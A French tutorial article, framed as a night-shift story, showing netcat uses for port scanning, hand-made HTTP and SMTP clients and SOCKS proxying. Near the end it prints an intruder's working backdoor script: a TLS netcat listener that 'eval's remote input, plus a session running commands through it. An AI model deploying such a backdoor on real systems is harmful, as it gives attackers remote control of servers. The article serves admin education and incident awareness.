---
title: Netcat, l’histoire d’un couteau suisse pour le réseau
description: 
published: true
date: 2023-04-21T10:39:02.232Z
tags: 
editor: markdown
dateCreated: 2023-04-21T10:38:57.858Z
---

# Netcat, l’histoire d’un couteau suisse pour le réseau

> Lier le monde de l’administration système et celui du réseau n’est pas chose aisée, ni donné à tout le monde. De nombreux outils présents issus du monde de l’open source essaient désespérément d’y trouver une place. L’un d’entre eux a par ailleurs une longueur d’avance. Permettant de jouer avec la création de socket sur la couche transport du modèle OSI, Netcat rayonne dans le monde underground depuis déjà de nombreuses années. Rien de tel qu’une petite histoire pour parler de ce programme légendaire...

## Introduction
3h37 du matin. Le téléphone d’astreinte sonne. Alice sort de son rêve, engourdie par le sommeil, mais trouve le courage de répondre. Une voix énergique et un peu énervée répond au bout du fil : «Alice ? C’est Fred ! Désolé de te réveiller, j’ai un souci sur la prod... il faut que tu me files un coup de main, j’ai perdu l’accès aux serveurs frontaux, y’a des trucs qui déconnent sur les back-end. Impossible d’avoir un prompt dessus ! La sup’ est encore en rade aussi, une nuit comme on les aime...», « Ok, je te tiens au courant, je te recontacte sur Matrix au plus vite ». Alice raccroche, se relève difficilement et s’assoit en tailleur dans son lit. Elle s’étire un peu, et, tout en baillant, récupère le laptop posé sur la table de chevet. L’ordinateur sort de sa courte veille. Elle rentre son login/password sur l’interface de xenodm, et arrive sur cwm, son gestionnaire de fenêtre favori. Le prompt de son terminal xterm clignote, prêt à une nuit d’investigation agitée.

L’architecture de la société Meldo.net est relativement simple. Quelques serveurs frontaux, quelques serveurs pour la partie back-end, des bases de données, des services hébergés sur des infrastructures Cloud… Le nom de domaine du site principal donnant accès aux différents produits est www.meldo.net. Pour commencer son échauffement et tenter se réveiller, Alice vérifie si les services web, utilisant les ports TCP 80 et 443, sont actifs. Pourquoi ne pas utiliser netcat [1] au lieu de nmap ? Netcat, outil créé à la fin des années 80 par un certain Hobbit, permet de créer arbitrairement des sockets réseaux, utilisant les protocoles TCP, UDP ou UNIX. L’argument -z de cette commande permet de faire un scan de port. L’argument -v permet quant à lui d’augmenter la verbosité. Cette fonctionnalité est certes rudimentaire, mais efficace. Netcat ouvre une connexion vers le site distant, et dès qu’une réponse est retournée, coupe la connexion. Cette action permet donc de valider l’état du service TCP distant.

```
alice@lingwe$ nc -zv www.meldo.net 80
Connection to meldo.net (195.154.221.230) 80 port [tcp/www] succeeded!
alice@lingwe$ nc -zv www.meldo.net 443
Connection to meldo.net (195.154.221.230) 443 port [tcp/https] succeeded
```

Alice sait aussi que Meldo.net gère quelques serveurs DNS, pour ce faire, rien de tel que l’utilisation de la même commande, mais en utilisant le protocole UDP au moyen du paramètre -u. Le scan d’un service UDP est légèrement différent. Étant donné qu’aucune connexion est créée à proprement parler, netcat envoie plusieurs paquets UDP. Si aucune réponse n’est renvoyée, le port est considéré comme ouvert. Si un paquet ICMP est reçu, alertant que le port en question n’est pas disponible, il est considéré comme fermé. Évidemment, ce type de scan fonctionne mieux quand aucun pare-feu n’est configuré, ce qui est le cas ici.

```
alice@lingwe$ nc -zuv meldo.net 53
Connection to meldo.net (195.154.221.230) 53 port [udp/domain] succeeded
```

Le serveur DNS semble être accessible. Alice étant désormais réveillée, une envie soudaine de tester sa mémoire lui vient à l’esprit. La commande curl est bien trop populaire à son goût, pourquoi ne pas forger sa propre commande au moyen de netcat ? Effectivement, netcat redirige les données reçues en entrée vers la connexion ouverte. Le protocole HTTP est un très bon exemple, protocole sans état, textuel jusqu’à la version 1.1, il est facile de créer une requête pour vérifier si un site répond à une donnée en particulier.

```
alice@lingwe$ printf -- "GET /ping HTTP/1.1\r\nHost: www.meldo.net\r\n\r\n" | nc www.meldo.net 80
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Tue, 20 Oct 2020 19:23:51 GMT
Content-Type: text/html
Content-Length: 162
Connection: close
Location: https://www.meldo.net/
 
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

Le site www.meldo.net répond correctement à la requête. Cette dernière contient une redirection permanente vers le même site, mais configuré en HTTPS. Étant donné que netcat est un outil relativement polyvalent et simple, il ne suit pas automatiquement la redirection indiquée par le serveur. Alice a un doute, est-ce que netcat supporte les connexions SSL/TLS ? Après une rapide lecture de la page du manuel, le paramètre -c permet d’activer le support des connexions chiffrées. Dans le cas où le certificat serait auto-signé, le paramètre -T suivi de la valeur noverify, permet d’outrepasser la vérification du certificat distant.

```
alice@lingwe$ nc -c www.meldo.net 443HTTP/1.1 200 OK
Server: nginx
Date: Tue, 20 Oct 2020 19:29:52 GMT
Content-Type: text/html
Content-Length: 34095
Last-Modified: Fri, 28 Feb 2020 16:53:00 GMT
Connection: keep-alive
Vary: Accept-Encoding
ETag: "5e59456c-852f"
Strict-Transport-Security: max-age=63072000
Accept-Ranges: bytes…
```

Alice se voit déjà rassurée et soupire. Les principales briques de l’infrastructure semblent fonctionnelles et répondent correctement aux différentes requêtes émises par un utilisateur externe. Mais quelques services restent encore à tester, comme le serveur SMTP ou l’accès à l’un des services internes via un « bastion SSH » maison. SMTP est un protocole à état, il nécessite de faire des échanges avec le serveur. Tout comme pour la vérification des services HTTP, netcat peut ici aussi devenir un client SMTP, voire un robot, en utilisant quelques fonctionnalités standards du shell. Pour ce faire, Alice va utiliser son éditeur de texte favori, mg, et créer un script shell permettant de jouer avec le service distant.

```shell
#!/bin/sh
# smtp_script.sh - a simple SMTP client implemented in shell scripting
_TARGET=${TARGET:-"localhost"}
_FROM=${FROM:-"me@localhost"}
_TO=${TO:-"root@localhost"}
_SUBJECT=${SUBJECT:-"test"}
_MESSAGE=${MESSAGE:-"my message"}
_STATE="_hello"
 
_debug() {
        printf -- "debug: %s\n" "${*}" 1>&2
}
 
_debug2() {
        local line
        while read line; do
                _debug "send: ${line}"
                printf -- "%s\n" "${line}"
        done
}
 
_hello() {
        printf -- "HELO %s\n" "${_TARGET}" | _debug2
        _STATE="_from"
}
 
_from() {
        printf -- "MAIL FROM: <%s>\n" "${_FROM}" | _debug2
        _STATE="_to"
}
 
_to() {
        printf -- "RCPT TO: <%s>\n" "${_TO}" | _debug2
        _STATE="_data"
}
 
_data() {
        printf -- "DATA\n" | _debug2
        _STATE="_message"
}
 
_message() {
        printf -- "Subject: %s\n\n" "${_SUBJECT}" | _debug2
        printf -- "%s\n.\n" "${_MESSAGE}" | _debug2
        _STATE="_quit"
}
 
_quit() {
        printf -- "QUIT\n" | _debug2
}
 
_smtp_robot() {
        local line
        while read line; do
                _debug "received: ${line}"
                case "${line}" in
                        220*) eval "${_STATE}";;
                        221*) return 0;;
                        250*) eval "${_STATE}";;
                        354*) eval "${_STATE}";;
                        550*) return 1;;
                        *) _debug "received: ${line}";;
                esac
        done
}
```

Alice sait que netcat peut faire office de relais, récupérant les données en entrée pour les envoyer directement sur le lien distant. Elle sait aussi que cette commande affiche par défaut ce qu’elle reçoit, ce qui permet de réinjecter le retour sur la sortie standard vers une autre commande. Elle crée donc un fichier FIFO, qui servira de queue pour les messages, elle charge le script précédemment créé directement dans son shell, et branche les différents composants entre eux au moyen de pipes ou de redirections. La première commande affiche le contenu du fichier FIFO, ce contenu est redirigé dans netcat, qui se connecte au serveur SMTP distant. La sortie de netcat est traitée par la fonction _smtp_robot(), dont la sortie est redirigée vers le fichier FIFO. La boucle est bouclée. Alice exécute cette commande et envoie manuellement un mail avec quelques fonctionnalités du shell, couplé à netcat.

```
alice@lingwe$ mkfifo smtp_fifo
alice@lingwe$ . ./smtp_script.sh
alice@lingwe$ cat smtp_fifo | nc smtp.meldo.net 25 | _smtp_robot >> smtp_fifo
...
```

Le serveur SMTP est fonctionnel ! Alice est rassurée, et pense de plus en plus qu’il s’agit d’un souci temporaire. Pour en être sûre, elle va se connecter via le « bastion SSH », qui permet d’avoir accès au reste de l’infrastructure. Ce bastion est un peu particulier. Il n’offre aucun shell, mais permet à l’utilisateur de créer une redirection dynamique en créant un proxy sock5 au moyen de SSH et du paramètre -D. Le proxy écoute alors sur l’adresse locale de la machine d’Alice, utilisant le port 1080. Pour utiliser ce relais, netcat doit utiliser le paramètre -X suivi de la version du protocole utilisé, ainsi que le paramètre -x suivi du couple adresse/port du serveur distant. Le reste de la commande est similaire aux commandes exécutées précédemment par Alice.

```
alice@lingwe$ ssh bastion.meldo.net -D 127.0.0.1:1080 &
alice@lingwe$ nc -zv -X 5 -x 127.0.0.1:1080 sql.meldo.net 3306
Connection to sql.meldo.net 3306 port [tcp/mysql] succeeded!
```

La base de données semble être accessible depuis le bastion, en tout cas la connexion TCP est ouverte. Alice se sent de plus en plus rassurée, mais doit tout de même se connecter sur le serveur principal pour pouvoir vérifier si tout est fonctionnel. Pour ce faire, elle va réutiliser le proxy sock5 entre son laptop et le bastion, pour y faire passer une autre connexion SSH vers le serveur front-end. La commande ssh permet d’utiliser un proxy via l’option ProxyCommand, invoquée ici avec l’argument -o, mais qui pourrait très bien être configuré dans la configuration ssh locale de l’utilisateur présent dans ${HOME}/.ssh/config. Les options %h et %p seront respectivement remplacées par le nom de l’hôte distant et le port associé.

```
alice@lingwe$ ssh -oProxyCommand="/usr/bin/nc -X 5 -x 127.0.0.1:8080 %h %p" meldo.net
alice@meldo.net$
```

Arrivée sur le serveur, ce dernier semble peu réactif. Après une analyse rapide des processus actifs avec les commandes ps, netstat et fstat, Alice constate qu’un processus est en écoute sur un port TCP peu commun, le port 64132. Étrange. Qui plus est, ce processus n’est autre que netcat… Alice réfléchit quelques secondes, et après analyse du processus étranger, trouve que la commande est exécutée dans un script stocké dans /tmp/reverse_shell.sh.

```shell
#/bin/sh
 
_callback() {
    local line
    while read line; do
        case "${line}" in
            date) printf -- "## "; date;;
            test*) printf -- "## %s\n" "this is just a test";;
            eval*) eval "${line}";;
            *) printf -- "## %s\n" "${line}";;
        esac
    done
}
 
_certificat() {    
        openssl req -x509 -new -outform pem -nodes -subj "/CN=localhost/" \
               -keyout /tmp/server.key -out /tmp/server.crt -batch -days 7}
 
_server() {
    mkfifo /tmp/fifo
    cat /tmp/fifo \        
            | nc -k -c -C /tmp/server.crt -K /tmp/server.key -l 64132 \        
            | _callback >> /tmp/fifo
}
 
_certificat
_server
```

Il semblerait qu’un petit malin ait trouvé un moyen d’arriver à rentrer sur le serveur et y créer un script ! Ce dernier utilise le même principe que celui d’Alice pour l’envoi de mail. Par ailleurs, c’est une version un peu plus évoluée. La fonction _callback() récupère des instructions et les exécute en renvoyant la réponse de la commande. À noter la fonction built-in eval, qui évalue le contenu de la valeur envoyée par le client. La fonction _certificat() permet de générer une clé ainsi qu’un certificat autosigné avec OpenSSL. Finalement, la fonction _server() génère un fichier FIFO, puis l’utilise en collaboration avec netcat. L’argument -k permet de garder le socket ouvert après la déconnexion d’un client, l’argument -c permet d’activer le chiffrement des connexions. Les arguments -C et -K permettent respectivement de configurer le certificat SSL et sa clé. Finalement, l’argument -l permet de faire écouter netcat sur le port TCP 64132 sur toutes les interfaces disponibles. Pour utiliser ce serveur, rien de tel que l’utilisation de netcat comme client.

```
alice@lingwe$ nc -c -T noverify www.meldo.net 64132
test
## this is just a test
date
## Thu Oct 22 19:32:09 UTC 2020
eval uname -a
OpenBSD www.meldo.net 6.8 GENERIC.MP#98 amd64
eval pwd
/tmp
```

Alice a donc trouvé la raison, une personne - probablement mal intentionnée - a trouvé le moyen d’avoir un accès sur le système et installé une porte dérobée utilisant netcat… La matinée vient tout juste de commencer, et de nombreuses actions doivent être prises d’urgence. Cela a tout de même permis à Alice de réviser ses bases en utilisant netcat ! La prochaine étape sera donc d’analyser et de comprendre l’attaque. Mais ceci est une toute autre histoire.

## Conclusion
Même si l’article reste dans le domaine de la fiction, la commande netcat reste un outil réellement utile pour les administrateurs systèmes et réseaux. Cet outil est utile dans de nombreuses situations. L’auteur a d’ores et déjà dû utiliser certaines de ces commandes pour venir à bout de problématiques plus ou moins complexes, généralement couplées à des outils comme ssh, tcpdump, nmap, socat ou encore curl. Pour les lecteurs les plus curieux, Alice utilise OpenBSD 6.8, système qui souffle cette année ses 25 bougies. N’oublions pas que toute la communauté sait qu’il n’y a eu que 2 failles à distances sur ce système et depuis un sacré bout de temps ! L’intégralité de l’article est par ailleurs reproductible sur la majorité des systèmes Unix/Linux standard, la version de netcat pour OpenBSD se nomme généralement netcat-openbsd.

## Référence
[1] Documentation officielle d’OpenBSD Netcat : https://man.openbsd.org/nc

## Pour aller plus loin
Netcat a eu de très nombreuses implémentations. L’équipe derrière nmap a créé ncat, une version marquée du sceau de GNU existe aussi et ne pas oublier socat, outil se rapprochant de netcat, mais offrant une plus grande souplesse au niveau des options. Merci le Hobbit pour cette création ! Chapeau bas, l’ami !

source : https://connect.ed-diamond.com/Linux-Pratique/lp-123/netcat-l-histoire-d-un-couteau-suisse-pour-le-reseau

